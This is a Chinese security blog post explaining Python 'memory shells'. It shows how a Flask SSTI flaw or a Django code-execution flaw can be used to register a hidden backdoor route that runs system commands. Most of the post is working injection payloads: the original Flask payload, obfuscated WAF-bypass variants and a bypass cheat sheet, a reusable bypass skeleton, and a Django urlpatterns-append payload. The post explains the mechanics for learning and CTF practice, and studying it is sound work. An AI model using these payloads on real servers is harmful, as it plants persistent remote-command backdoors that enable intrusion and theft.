<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>python 内存马 | ALe's Blog</title><meta name="author" content="ALe"><meta name="copyright" content="ALe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="之前一直想学内存马，但是碍于对 java 的了解近乎为0，对jndi的了解也是只停留在会背面经的层面，所以一直没有去学，直到后来翻一些文章发现 python 也可以利用 SSTI 进行内存马注入，于是迅速开整 Flask常见的 Python Web 框架如 Django 和 Flask 都有可能存在 SSTI（Server-Side Template Injection，服务端模板注入）漏洞 在">
<meta property="og:type" content="article">
<meta property="og:title" content="python 内存马">
<meta property="og:url" content="https://ale1293528.github.io/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="ALe&#39;s Blog">
<meta property="og:description" content="之前一直想学内存马，但是碍于对 java 的了解近乎为0，对jndi的了解也是只停留在会背面经的层面，所以一直没有去学，直到后来翻一些文章发现 python 也可以利用 SSTI 进行内存马注入，于是迅速开整 Flask常见的 Python Web 框架如 Django 和 Flask 都有可能存在 SSTI（Server-Side Template Injection，服务端模板注入）漏洞 在">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ale1293528.github.io/img/anon2.png">
<meta property="article:published_time" content="2025-07-21T14:43:33.000Z">
<meta property="article:modified_time" content="2025-07-27T23:40:13.809Z">
<meta property="article:author" content="ALe">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ale1293528.github.io/img/anon2.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "python 内存马",
  "url": "https://ale1293528.github.io/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/",
  "image": "https://ale1293528.github.io/img/anon2.png",
  "datePublished": "2025-07-21T14:43:33.000Z",
  "dateModified": "2025-07-27T23:40:13.809Z",
  "author": [
    {
      "@type": "Person",
      "name": "ALe",
      "url": "https://ale1293528.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ale1293528.github.io/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'python 内存马',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/anon2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ALe's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">python 内存马</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">python 内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-21T14:43:33.000Z" title="Created 2025-07-21 22:43:33">2025-07-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-27T23:40:13.809Z" title="Updated 2025-07-28 07:40:13">2025-07-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>之前一直想学内存马，但是碍于对 java 的了解近乎为0，对jndi的了解也是只停留在会背面经的层面，所以一直没有去学，直到后来翻一些文章发现 python 也可以利用 SSTI 进行内存马注入，于是迅速开整</p>
<h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p>常见的 Python Web 框架如 <strong>Django</strong> 和 <strong>Flask</strong> 都有可能存在 SSTI（Server-Side Template Injection，服务端模板注入）漏洞</p>
<p>在 Flask 中，使用 <code>render_template_string()</code> 渲染模板时，若将用户输入直接传入而<strong>未做过滤处理</strong>，就可能导致 SSTI 漏洞。攻击者可通过该漏洞注入恶意模板代码，从而实现 <strong>代码执行</strong>，甚至进一步植入 <strong>内存马</strong></p>
<h3 id="内存马注入原理（Flask-路由机制）"><a href="#内存马注入原理（Flask-路由机制）" class="headerlink" title="内存马注入原理（Flask 路由机制）"></a>内存马注入原理（Flask 路由机制）</h3><p>Flask 常规注册路由的方式是通过装饰器 <code>@app.route()</code>，但底层实际是调用了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.add_url_rule(rule, endpoint=None, view_func=None)</span><br></pre></td></tr></table></figure>

<p>各参数说明如下：</p>
<ul>
<li><code>rule</code>：URL 路径（必须以 <code>/</code> 开头），与 <code>@app.route()</code> 中的路径一致</li>
<li><code>endpoint</code>：视图函数的唯一标识，在使用 <code>url_for()</code> 反向生成 URL 时会用到，默认为函数名</li>
<li><code>view_func</code>：绑定的视图函数（<strong>关键参数</strong>），可以是函数名，也可以是匿名函数（lambda）</li>
</ul>
<p> 因此，只要能通过 SSTI 或其他 RCE 手段执行 <code>add_url_rule()</code> 并注入恶意 <code>view_func</code>，就可以<strong>动态注册一个后门路由，实现命令执行或内存马植入</strong>。 </p>
<h3 id="Flask-上下文机制（Context）"><a href="#Flask-上下文机制（Context）" class="headerlink" title="Flask 上下文机制（Context）"></a>Flask 上下文机制（Context）</h3><p>要动态注册路由并执行命令，核心在于<strong>控制 <strong><code>**view_func**</code></strong> 的行为</strong>。通常可使用 <strong>匿名函数 lambda</strong> 来实现远程命令执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lambda: os.popen(request.args.get(&#x27;cmd&#x27;)).read()</span><br></pre></td></tr></table></figure>

<p>这需要依赖 Flask 的上下文机制（Context）：</p>
<p>Flask 中的上下文分为两类：</p>
<ul>
<li><strong>请求上下文（Request Context）</strong>：包含请求相关的数据，如 <code>request</code>, <code>session</code>, <code>g</code> 等</li>
<li><strong>应用上下文（Application Context）</strong>：包含全局应用状态，如 <code>current_app</code>, <code>app</code> 等</li>
</ul>
<p> 当一个 HTTP 请求进入 Flask 应用时，Flask 会自动：  </p>
<ul>
<li>实例化一个 <strong>Request Context</strong></li>
<li>**Request Context **包含在 <code>Request</code> 对象中，并被推入 <code>_request_ctx_stack</code> 栈结构</li>
<li>获取当前请求对象，即可通过 <code>_request_ctx_stack.top</code> 获取当前上下文</li>
</ul>
<p>这使得我们在构造 payload 时，能访问如 <code>request</code>, <code>app</code>, <code>os</code> 等对象并执行逻辑</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>这里我们从 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10381">https://xz.aliyun.com/news/10381</a> 这篇文章找一个漏洞环境 demo 来实验</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello_world():  # put application&#x27;s code here</span><br><span class="line">    person = &#x27;knave&#x27;</span><br><span class="line">    if request.args.get(&#x27;name&#x27;):</span><br><span class="line">        person = request.args.get(&#x27;name&#x27;)</span><br><span class="line">    template = &#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27; % person</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>原始 Flask 内存马 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure>

<p>我们来分析一下这个 payload</p>
<p>先将他展开：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](</span><br><span class="line">  &quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,</span><br><span class="line">  &#123;</span><br><span class="line">    &#x27;_request_ctx_stack&#x27;: url_for.__globals__[&#x27;_request_ctx_stack&#x27;],</span><br><span class="line">    &#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤分解："><a href="#步骤分解：" class="headerlink" title="步骤分解："></a>步骤分解：</h3><h4 id="url-for-globals"><a href="#url-for-globals" class="headerlink" title="url_for.__globals__"></a><code>url_for.__globals__</code></h4><ul>
<li><code>url_for</code> 是 Flask 中的函数，而 Python 中函数对象有一个属性叫 <code>__globals__</code></li>
<li>所以可以通过 <code>url_for.__globals__</code> 拿到全局作用域字典</li>
<li>可以进一步访问到各种内置对象，比如：<ul>
<li><code>__builtins__[&#39;eval&#39;]</code></li>
<li><code>current_app</code></li>
<li><code>_request_ctx_stack</code></li>
</ul>
</li>
</ul>
<h4 id="执行-eval-代码"><a href="#执行-eval-代码" class="headerlink" title="执行 eval(...) 代码"></a>执行 <code>eval(...)</code> 代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;app.add_url_rule(...)&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>把构造好的 Python 代码字符串传入 <code>eval()</code>，相当于运行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda: os.popen(cmd).read())</span><br></pre></td></tr></table></figure>

<h4 id="注册后门路由-shell"><a href="#注册后门路由-shell" class="headerlink" title="注册后门路由 /shell"></a>注册后门路由 <code>/shell</code></h4><p>这句代码的作用就是动态往 Flask 应用注册一个新的路由 <code>/shell</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    &#x27;/shell&#x27;,          # 路由地址</span><br><span class="line">    &#x27;shell&#x27;,           # endpoint 名称</span><br><span class="line">    lambda: __import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lambda:</code> 是匿名函数，作为 <code>view_func</code></li>
<li><code>os.popen(cmd).read()</code> 执行系统命令</li>
<li>命令从当前请求对象中获取：<code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;)</code></li>
</ul>
<p>执行 payload 后，内存中注册了一个后门：</p>
<p>你就可以直接访问：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:5000/shell?cmd=whoami</span><br></pre></td></tr></table></figure>

<p>获得系统命令的执行结果</p>
<p>当然了实战肯定是有过滤的，可以先 fenjing 一把梭，梭完再根据 fenjing 的 payload 的 bypass 方法对上面的 payload 进行修改</p>
<p>我对 bypass 不是很擅长，直接复制粘贴了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+ url_for可替换为get_flashed_messages或者request.__init__或者request.application.</span><br><span class="line">+ 代码执行函数替换, 如exec等替换eval.</span><br><span class="line">+ 字符串可采用拼接方式, 如[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]变为[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;].</span><br><span class="line">+ __globals__可用__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;)替换.</span><br><span class="line">+ []可用.__getitem__()或.pop()替换.</span><br><span class="line">+ 过滤&#123;&#123;或者&#125;&#125;, 可以使用&#123;%或者%&#125;绕过, &#123;%%&#125;中间可以执行if语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</span><br><span class="line">+ 过滤_可以用编码绕过, 如__class__替换成\x5f\x5fclass\x5f\x5f, 还可以用dir(0)[0][0]或者request[&#x27;args&#x27;]或者request[&#x27;values&#x27;]绕过.</span><br><span class="line">+ 过滤了.可以采用attr()或[]绕过.</span><br><span class="line">+ 其它的手法参考SSTI绕过过滤的方法即可...</span><br></pre></td></tr></table></figure>

<p>这里给出两个变形Payload:</p>
<p>原Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure>

<p>变形 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;)</span><br><span class="line">.__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)(</span><br><span class="line">    &quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;, &#x27;calc&#x27;)).read())&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;_request_ct&#x27;+&#x27;x_stack&#x27;: get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;_request_&#x27;+&#x27;ctx_stack&#x27;),</span><br><span class="line">        &#x27;app&#x27;: get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;curre&#x27;+&#x27;nt_app&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">get_flashed_messages</span><br><span class="line">|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)</span><br><span class="line">|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;eval&quot;)(</span><br><span class="line">  &quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;,</span><br><span class="line">  &#123;</span><br><span class="line">    &#x27;_request_ctx_stack&#x27;: get_flashed_messages</span><br><span class="line">      |attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)</span><br><span class="line">      |attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;_request_ctx_stack&quot;),</span><br><span class="line">    &#x27;app&#x27;: get_flashed_messages</span><br><span class="line">      |attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)</span><br><span class="line">      |attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;current_app&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<hr>
<p>你可以抽象出一套 SSTI 的「绕过骨架」模板，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; </span><br><span class="line">  &lt;全局对象&gt;</span><br><span class="line">  |attr(&quot;__getattribute__&quot;)(&quot;__globals__&quot;)</span><br><span class="line">  |attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">  |attr(&quot;__getitem__&quot;)(&quot;eval&quot;)</span><br><span class="line">  (&quot;&lt;代码字符串&gt;&quot;, &#123;</span><br><span class="line">    &#x27;app&#x27;: &lt;全局对象&gt;|...,</span><br><span class="line">    &#x27;_request_ctx_stack&#x27;: &lt;全局对象&gt;|...</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后根据不同题目的 WAF 实际情况：</p>
<ul>
<li>替换对象入口（<code>url_for</code>, <code>get_flashed_messages</code>, <code>request</code> 等）</li>
<li>替换函数调用方式（拼接、编码、attr）</li>
<li>替换代码逻辑（文件读写 &#x2F; 反弹 shell &#x2F; 打印 token）</li>
</ul>
<hr>
<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>Django会使用一个名为<code>urlpatterns</code>的全局列表来存储所有的URL路由信息。每一项由<code>path()</code>或<code>re_path()</code>函数返回，用于将 URL 映射到某个视图函数（或类视图）</p>
<p>那么为了可以动态的向<code>urlpatterns</code>中添加新的路径，可以引入一个新的可访问端点，该端点用于接收命令和返回结果</p>
<p>那么就要获取<code>settings</code>这个对象，从而读取到<code>settings.py</code>文件中的 ROOT_URLCONF（用于指定当前路由入口）</p>
<p>而 Python 中函数对象有一个特殊属性<code>__globals__</code>，他保存了该函数所在模块的全局命名空间字典。攻击者可以从任意一个视图函数出发，通过<code>request</code>传入的函数对象，访问到其全局变量，包括<code>settings</code>、<code>urlpatterns</code>、其他导入模块等。在 Django 视图函数中，可以从<code>request</code>参数关联的任何函数出发，访问到整个模块的全局变量，包括 Django 项目的设置和URL配置。</p>
<p>那么直接将其导入，就可以获得当前应用的入口</p>
<p>这个时候， 就可以通过访问<code>urls.urlpatterns</code>来操作路由列表了</p>
<p>在路由定义中，每一条路由都会调用<code>path</code>函数来进行定义</p>
<p><code>path</code>函数接收四个参数：<code>route</code>、<code>view</code>、<code>kwargs</code>和<code>name</code>，其中<code>kwargs</code>和<code>name</code>是可选参数。主要关注的是前两个参数：</p>
<p><strong>route</strong>: 这是一个字符串，表示匹配的URL模式。</p>
<p><strong>view</strong>: 这是一个可调用对象，当URL匹配时会被调用。它可以是：</p>
<ul>
<li>一个普通的Python函数（视图函数）</li>
<li>一个继承自<code>django.views.View</code>的类，并通过<code>.as_view()</code>方法转换为可调用对象</li>
<li>包含<code>(urlconf_module, app_name, namespace)</code>的元组或列表，用于包含其他URL配置</li>
</ul>
<p><code>_path</code>函数对<code>view</code>参数有特定的要求，具体如下：</p>
<ul>
<li>如果<code>view</code>是一个可调用对象（例如普通函数或实现了<code>__call__</code>方法的对象），则直接将其作为视图函数处理。</li>
<li>如果<code>view</code>是一个包含(urlconf_module, app_name, namespace)的元组或列表，则用于包含其他URL配置。</li>
<li>如果<code>view</code>是一个继承自<code>django.views.View</code>的类，则需要调用其<code>.as_view()</code>方法将其转换为可调用对象。</li>
<li>如果<code>view</code>不符合上述任何一种情况，则会抛出<code>TypeError</code>异常。<br>由于<code>_path</code>函数要求视图参数必须是可调用的，我们可以使用Python 的 lambda 表达式来快速定义一个简单的视图函数。 Lambda 表达式是一种创建匿名函数的方式，非常适合这种场景。</li>
</ul>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;django&#x27;).urls.path(&#x27;shell&#x27;, </span><br><span class="line">    lambda request: __import__(&#x27;django&#x27;).http.HttpResponse(</span><br><span class="line">        __import__(&#x27;os&#x27;).popen(request.GET.get(&#x27;cmd&#x27;,&#x27;id&#x27;)).read()</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>分解逻辑：</p>
<ul>
<li><strong>import</strong>(‘django’)：动态导入 django 模块（等价于 import django）</li>
<li>.urls.path(…)：调用 django.urls.path 函数，创建一个 URL 路由规则</li>
<li>‘shell’：设置路由路径 &#x2F;shell&#x2F;</li>
<li>lambda request: …：视图函数，接收 request，执行命令并返回结果</li>
<li><strong>import</strong>(‘os’).popen(…)：使用 os.popen 执行命令<br>request.GET.get(‘cmd’, ‘id’)：从 GET 请求中读取参数 cmd，默认执行 id</li>
<li>HttpResponse(…)：返回命令执行的结果</li>
</ul>
<p>将这个新路由 append 到 app.urlpatterns 中就可以实现内存马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(request.get_port.__globals__[&quot;settings&quot;].ROOT_URLCONF).urls.urlpatterns.append(__import__(&#x27;django&#x27;).urls.path(&#x27;shell&#x27;,lambda request: __import__(&#x27;django&#x27;).http.HttpResponse(__import__(&#x27;os&#x27;).popen(request.GET.get(&#x27;cmd&#x27;,&#x27;id&#x27;)).read())))</span><br></pre></td></tr></table></figure>

<p>也可以使用<code>subprocess.check_output()</code>来执行命令</p>
